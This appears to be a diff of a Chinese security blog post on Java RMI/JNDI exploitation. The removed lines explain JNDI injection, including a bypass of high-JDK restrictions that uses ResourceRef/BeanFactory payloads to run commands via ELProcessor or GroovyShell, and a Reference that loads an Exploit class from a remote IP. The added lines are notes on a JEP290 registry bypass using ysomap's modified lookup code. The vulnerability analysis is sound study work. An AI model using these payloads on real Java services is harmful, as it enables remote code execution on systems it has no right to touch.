+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改之后的lookup</span></span><br><span class="line">      Naming.lookup(registry, remoteObject);</span><br></pre></td></tr></table></figure>
+<p>那么为什么不用以下的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">registry.lookup(remoteObject);</span><br><span class="line">registry.bind(<span class="string">&#x27;test&#x27;</span>,remoteObject)</span><br></pre></td></tr></table></figure>
+
+<p>这两个是因为不同的原因，依次单独来讲</p>
+<h5 id="实现lookup-object"><a href="#实现lookup-object" class="headerlink" title="实现lookup(object)"></a>实现lookup(object)</h5><p>lookup只接受String类型的参数，直接传object肯定不行，参考【1】中提及了直接改包，比较直接暴力这里不深入跟进</p>
+<p>还有一种是ysomap中重写lookup函数的方式，来看看具体实现</p>
+<p>ysomap.core.exploit.rmi.component.Naming#lookup</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span><span class="params">(Registry registry, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 段1</span></span><br><span class="line">        RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> interfaceHash = (<span class="keyword">long</span>) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;interfaceHash&quot;</span>);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            	<span class="comment">// 段2</span></span><br><span class="line">                java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">                <span class="comment">//反射修改enableReplace</span></span><br><span class="line">                ReflectionHelper.setFieldValue(out, <span class="string">&quot;enableReplace&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">                out.writeObject(obj); <span class="comment">// arm obj</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            ref.invoke(call);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | RemoteException | NotBoundException e) &#123;</span><br><span class="line">            <span class="keyword">if</span>(e <span class="keyword">instanceof</span> RemoteException| e <span class="keyword">instanceof</span> ClassCastException)&#123;</span><br><span class="line">                Logger.success(<span class="string">&quot;exploit remote registry success!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ref.done(call);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对比下sun.rmi.registry.RegistryImpl_Stub$lookup</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Remote <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="comment">// 其实只实现了这段逻辑</span></span><br><span class="line">            <span class="comment">// ----------start----------</span></span><br><span class="line">            RemoteCall var2 = <span class="keyword">this</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">			</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, var17);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.ref.invoke(var2);</span><br><span class="line">            <span class="comment">// ----------end----------</span></span><br><span class="line"></span><br><span class="line">            Remote var22;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectInput var4 = var2.getInputStream();</span><br><span class="line">                var22 = (Remote)var4.readObject();</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现：</p>
+<ol>
+<li>ysomap Naming$lookup其实只实现到发送ref.invoke</li>
+<li>段1通过反射，获取RemoteCall</li>
+<li>注意段2有给out增加属性enableReplace=false;发送的是Object类型的obj，而不是原来的String</li>
+</ol>
+<p>其中enableReplace=false有深意</p>
+<h5 id="enableReplace-false"><a href="#enableReplace-false" class="headerlink" title="enableReplace=false"></a>enableReplace=false</h5><p><strong>这里很重要</strong></p>
+<p>强烈建议阅读参考【1】原文关于enableReplace 这一段，这里就直接引用相关重要结论</p>
 <ul>
-<li>InitialContext </li>
-<li>Registry </li>
-</ul>
-<p>所以其实可以看出，通过JNDI-RMI攻击客户端，客户端的必须是JNDI写法的client，类Context的实例lookup方法，而不是RMI Registry.lookup，并不通用。</p>
-<h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><p>还是参考【1】，讲得太细致了，直接照搬</p>
-<blockquote>
-<p>但是在JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p>
+<li><blockquote>
+<p>我们默认理解为序列化过程是对于我们的恶意object进行writeobject，RMIConnectionImpl_Stub.writeobject()、UnicastRemoteObject.writeobject()那么当然是序列化的。（实际上也可以，在github的Bypass290代码中尝试序列化写入了文件中进行查看，结果也是把正确的ref值写入了，就不贴图了）</p>
 </blockquote>
-<p><img src="/images/pasted-34.png" alt="upload successful"></p>
-<p>默认com.sun.jndi.rmi.object.trustURLCodebase false<br><img src="/images/pasted-38.png" alt="upload successful"></p>
-<p>手动设置trustURLCodebase true<br><img src="/images/pasted-39.png" alt="upload successful"></p>
-<h4 id="限制逻辑"><a href="#限制逻辑" class="headerlink" title="限制逻辑"></a>限制逻辑</h4><p>实现trustURLCodebase 的逻辑在com.sun.jndi.rmi.registry.RegistryContext</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">...</span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        PrivilegedAction var0 = () -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> System.getProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        String var1 = (String)AccessController.doPrivileged(var0);</span><br><span class="line">        trustURLCodebase = <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>留个疑问：<br>com.sun.jndi.cosnaming.object.trustURLCodebase这个对应的client姿势是什么？</p>
-<h2 id="绕过高版本限制"><a href="#绕过高版本限制" class="headerlink" title="绕过高版本限制"></a>绕过高版本限制</h2><p>根据文档和历史老师傅们的文章，可以知道trustURLCodebase 限制的是Naming/Directory服务中JNDI Reference远程加载Object Factory类，那么思路就剩下本地Factory了。</p>
-<h3 id="JNDI-RMI-Evil-Server-Code解析"><a href="#JNDI-RMI-Evil-Server-Code解析" class="headerlink" title="JNDI-RMI Evil Server Code解析"></a>JNDI-RMI Evil Server Code解析</h3><p>我们把低版本的Evil Server poc拆来看</p>
-<ol>
-<li><p><code>Registry registry = LocateRegistry.createRegistry(1099);</code></p>
-<p> 创建rmi注册中心</p>
 </li>
-<li><p><code>Reference reference = new Reference(&quot;Exploit&quot;,&quot;Exploit&quot;,&quot;http://30.225.32.59:8080/&quot;);</code></p>
-<p> 构造函数： public Reference(String className, String factory, String factoryLocation) {}</p>
-<p> Reference是JNDI的概念，简单理解成ln -s软连接即可</p>
-<p> 这行可理解为：创建一个Reference 类，并把一个类名Exploit至远程factory，地址为<a target="_blank" rel="noopener" href="http://30.225.32.59:8080/#Exploit">http://30.225.32.59:8080/#Exploit</a></p>
+<li><blockquote>
+<p>但是实际上客户端序列化的过程为：ObjectOutput.writeobject(我们的恶意object)</p>
+</blockquote>
 </li>
-<li><p><code>ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</code></p>
-<p> ReferenceWrapper构造函数：public class ReferenceWrapper extends UnicastRemoteObject implements RemoteReference {}</p>
-<p> UnicastRemoteObject 和 RemoteReference 很熟悉也没有，就是前文Demo讲过RMI 远程加载的类继承自 UnicastRemoteObject，这行的作用就是把Reference 对象打包成支持RMI。</p>
-</li>
-<li><p><code>registry.bind(&quot;Exploit&quot;,referenceWrapper);</code></p>
-<p> 绑定至rmi注册中心</p>
-</li>
-</ol>
-<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>那接下来在本地找利用链的思路就明确了</p>
-<ol>
-<li>找到其他的Reference类</li>
-<li>找到本地的类，其实例化过程可被利用，或者配合Reference特性可被利用，比如set函数</li>
-</ol>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>参考【1】，先直接给出POC，常利用有两总姿势：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * Need : Tomcat 8+ or SpringBoot 1.2.x+ in classpath，because javax.el.ELProcessor.</span><br><span class="line"> *&#x2F;</span><br><span class="line">public ReferenceWrapper execByEL() throws RemoteException, NamingException&#123;</span><br><span class="line">    ResourceRef ref &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x&#x3D;eval&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;x&quot;, String.format(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(&quot; +</span><br><span class="line">                    &quot;\&quot;java.lang.Runtime.getRuntime().exec(&#39;%s&#39;)\&quot;&quot; +</span><br><span class="line">                    &quot;)&quot;,</span><br><span class="line">            commandGenerator.getBase64CommandTpl()</span><br><span class="line">    )));</span><br><span class="line">    return new ReferenceWrapper(ref);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * Need : Tomcat and groovy in classpath.</span><br><span class="line"> *&#x2F;</span><br><span class="line">public ReferenceWrapper execByGroovy() throws RemoteException, NamingException&#123;</span><br><span class="line">    ResourceRef ref &#x3D; new ResourceRef(&quot;groovy.lang.GroovyShell&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x&#x3D;evaluate&quot;));</span><br><span class="line">    String script &#x3D; String.format(&quot;&#39;%s&#39;.execute()&quot;, commandGenerator.getBase64CommandTpl());</span><br><span class="line">    ref.add(new StringRefAddr(&quot;x&quot;,script));</span><br><span class="line">    return new ReferenceWrapper(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</ul>
+<p>java.io.ObjectOutputStream#writeObject0</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">        depth++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//一大堆类型检查，都不会通过</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 想要去检查替换我们的object</span></span><br><span class="line">            Object orig = obj;</span><br><span class="line">            Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">            ObjectStreamClass desc;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="comment">//查找相关内容</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (enableReplace) &#123;<span class="comment">//都是true</span></span><br><span class="line">            <span class="comment">//!!!!!!!!!!!此处替换了我们的对象！！！！！！！！！！</span></span><br><span class="line">                Object rep = replaceObject(obj);</span><br><span class="line">                <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    cl = rep.getClass();</span><br><span class="line">                    desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                obj = rep;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//一些替换后的处理，不太重要</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过类进行分配序列化过程</span></span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                writeString((String) obj, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">                writeArray(obj, desc, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">                writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">                <span class="comment">//进入此处再开始正常的序列化</span></span><br><span class="line">                writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">            <span class="comment">//...省略...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><h4 id="1-其他的Reference类：org-apache-naming-ResourceRef"><a href="#1-其他的Reference类：org-apache-naming-ResourceRef" class="headerlink" title="1. 其他的Reference类：org.apache.naming.ResourceRef"></a>1. 其他的Reference类：org.apache.naming.ResourceRef</h4><p>ResourceRef继承Reference。ResourceRef有两个构造函数</p>
-<pre><code>public ResourceRef(String resourceClass, String description, String scope, String auth, boolean singleton)
+<p>replaceobject替换的方法具体在sun.rmi.server.MarshalOutputStream#replaceObject中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1就是我们想要序列化的类</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title">replaceObject</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//这个类要是Remote接口的，并且不是RemoteStub接口的，为true</span></span><br><span class="line">    <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote &amp;&amp; !(var1 <span class="keyword">instanceof</span> RemoteStub)) &#123;</span><br><span class="line">        <span class="comment">//这里会去获取到新的对象来替换</span></span><br><span class="line">        <span class="comment">//UnicastRemoteObject走的就是这条路</span></span><br><span class="line">        Target var2 = ObjectTable.getTarget((Remote)var1);</span><br><span class="line">        <span class="keyword">if</span> (var2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> var2.getStub();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//RMIConnectionImpl_Stub走的就是这条路</span></span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-ResourceRef(String resourceClass, String description, String scope, String auth, boolean singleton, String factory, String factoryLocation)</code></pre>
-<p>第一个猜测应该是直接绑定类名，这个类之后会被client实例化，如果要利用那么要么构造函数有可利用，这种情况少见几乎没有。</p>
-<p>第二个则用到了Factory（对象工厂），可操作的就更多了，下面详细介绍下。</p>
-<h4 id="2-javax-naming-spi-ObjectFactory"><a href="#2-javax-naming-spi-ObjectFactory" class="headerlink" title="2. javax.naming.spi.ObjectFactory"></a>2. javax.naming.spi.ObjectFactory</h4><p>ObjectFactory 是对象工厂接口，需要自定义实现接口getObjectInstance。这是JNDI的概念，前文的低版本JNDI注入，原理就是JNDI client加载时会执行ObjectFactory 的getObjectInstance 函数。</p>
-<h4 id="3-org-apache-naming-factory-BeanFactory"><a href="#3-org-apache-naming-factory-BeanFactory" class="headerlink" title="3. org.apache.naming.factory.BeanFactory"></a>3. org.apache.naming.factory.BeanFactory</h4><p>getObjectInstance，其实和python的序列化库piclke __reduce__ 类似，也和反序列化的readObject类似，作用都是自定义解析string还原成对象的方法。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanFactory</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,Hashtable&lt;?,?&gt; environment)</span></span>&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>obj是ReferenceRef，name是待生成的类名，nameCtx 可以理解为上线文，environment为环境参数</p>
-<p>主要由BeanFactory创建指定类分两步实现：</p>
-<ol>
-<li><p>forceString，找到需要forceString的参数</p>
-</li>
-<li><p>遍历ref的addrs，逐一赋值，如果是forceString，则根据自定义的对应函数进行赋值；如果不是，则使用默认get/set函数赋值（代码猜测，未跟进）</p>
-</li>
-</ol>
-<p>问题出现在forceString 可自定义，相当于可以调用任意类的函数，且参数也可自定义</p>
-<h4 id="4-实例化过程可被利用的类"><a href="#4-实例化过程可被利用的类" class="headerlink" title="4. 实例化过程可被利用的类"></a>4. 实例化过程可被利用的类</h4><ol>
-<li>javax.el.ELProcessor</li>
-<li>groovy.lang.GroovyShell</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;KINGX=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;KINGX&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;open -a calculator.app&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;groovy.lang.GroovyShell&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=evaluate&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a calculator.app\&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>
-
-<p>调试下ELProcessor，需要注意的几处</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取需要自定义函数的参数</span></span><br><span class="line">forced.put(param,beanClass.getMethod(setterName, paramTypes));</span><br><span class="line"><span class="comment">// 2. 调用对应自定义函数</span></span><br><span class="line">method.invoke(bean, valueArray);</span><br><span class="line"><span class="comment">// 3. 调用默认set属性函数（猜测未跟进）</span></span><br><span class="line">BeanInfo bi = Introspector.getBeanInfo(beanClass);</span><br><span class="line">PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line">Method setProp = pda[i].getWriteMethod();</span><br><span class="line">setProp.invoke(bean, valueArray);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/pasted-40.png" alt="upload successful"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节简要跟进了低版本jdk 的JNDI-RMI注入，以及在8u121 trustURLCodebase默认为false之后的绕过方法。知其然，更需要知其所以然，分析了ResourceRef-BeanFactory-ELProcessor/GroovyShell 利用链的原理，更重要的是如何发现这个利用链的思路。</p>
-<p>篇末抛几个问题</p>
-<ol>
-<li>com.sun.jndi.cosnaming.object.trustURLCodebase这个对应的client姿势是什么</li>
-<li>找到新的本地利用链</li>
-<li>理论上JNDI-RMI，也可以和RMI一样利用本地的反序列化Gadgets，会有区别吗？突破RMI本地利用的一些限制？</li>
-</ol>
+<h5 id="通过bind攻击"><a href="#通过bind攻击" class="headerlink" title="通过bind攻击"></a>通过bind攻击</h5><p>理解以上的原理，lookup适用的bind同样适用，ysomap Naming增加同样的bind函数即可。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节只能算是参考【1】中的jep290 An Trinh方式的复现笔记，其间几个重点类的构造巧妙，只能通过正向调试分析为什么可以，至于逆向分析为什么会想到这个思路，顶礼膜拜，不能望其项背。</p>
+<p>还有8u241等知识点未复现，之后有空再作记录。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li>[1] <a target="_blank" rel="noopener" href="https://paper.seebug.org/942/">如何绕过高版本 JDK 的限制进行 JNDI 注入利用</a></li>
-<li>[2] <a target="_blank" rel="noopener" href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></li>
+<li>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7932#toc-6">针对RMI服务的九重攻击 - 下</a></li>
+<li>[2] <a target="_blank" rel="noopener" href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/">AN TRINHS RMI REGISTRY BYPASS</a></li>
+<li>[3] <a target="_blank" rel="noopener" href="https://java.com/zh_CN/download/faq/release_changes.xml">Java 8 发行版要点说明</a></li>
+<li>[4] <a target="_blank" rel="noopener" href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">一次攻击内网rmi服务的深思</a></li>
+<li>[5] <a target="_blank" rel="noopener" href="http://code2sec.com/javafan-xu-lie-hua-lou-dong-xue-xi-shi-jian-san-li-jie-javade-dong-tai-dai-li-ji-zhi.html">Java反序列化漏洞学习实践三：理解java的动态代理机制</a></li>
 </ul>
 
       
@@ -332,11 +365,15 @@ ResourceRef(String resourceClass, String description, String scope, String auth,
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">JNDI</a>
